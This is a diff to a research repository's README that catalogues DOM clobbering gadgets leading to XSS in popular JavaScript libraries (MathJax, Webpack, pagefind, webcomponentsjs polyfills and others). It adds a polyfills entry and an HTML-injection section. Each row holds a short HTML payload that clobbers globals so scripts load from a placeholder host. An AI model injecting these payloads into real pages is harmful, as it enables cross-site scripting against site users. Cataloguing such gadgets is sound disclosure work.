@@ -1,6 +1,8 @@
 # DOM Clobbering Collection
 
-In this repo, we collect a list of client-side libraries (>1K stars on Github or maintained by large companies) that contains DOM Clobbering gadgets that lead to severe consequences, e.g., XSS.
+In this repo, we collect a list of client-side libraries that are either vulnerable to HTML injection or contain DOM Clobbering gadgets that lead to severe consequences, e.g., XSS.
+
+## HTML Injection
 
 ## DOM Clobbering Gadgets
 
@@ -13,5 +15,6 @@ In this repo, we collect a list of client-side libraries (>1K stars on Github or
 | [MathJax](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/mathjax.md) | 10.1K |2.7.x | ```<a id="MathJax"></a> <a id="MathJax" name="root" href="https://xxx.xxx.xxx"></a>``` | XSS | TheHulk | N/A |
 | [MathJax](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/mathjax3.md) | 10.1K |3.2.2 | ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img> $$\require{tex}$$``` | XSS | TheHulk | N/A |
 | [pagefind](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/pagefind.md) | 3.3K |v1.1.0 | ```<img name="currentScript" src="blob:https://xxx.xxx.xxx/ui.js"></img>``` | XSS | TheHulk | N/A |
+| [polyfills/webcomponentsjs](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/polyfills.md) | 1.1K |2.8.0 | ```<a id="ShadyDOM"></a><a id="ShadyDOM" name="force"></a><a id="WebComponents"></a><a id="WebComponents" name="root" href="https://xxx.xxx.xxx"></a>``` | XSS | TheHulk | N/A |
 | [steal](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/steal.md) | 1.4K |2.3.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx">``` | XSS | TheHulk | N/A |
 | [Webpack](https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/webpack.md) | 64.4K |5.x.x | ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img>``` | XSS | TheHulk | CVE-2024-43788 |
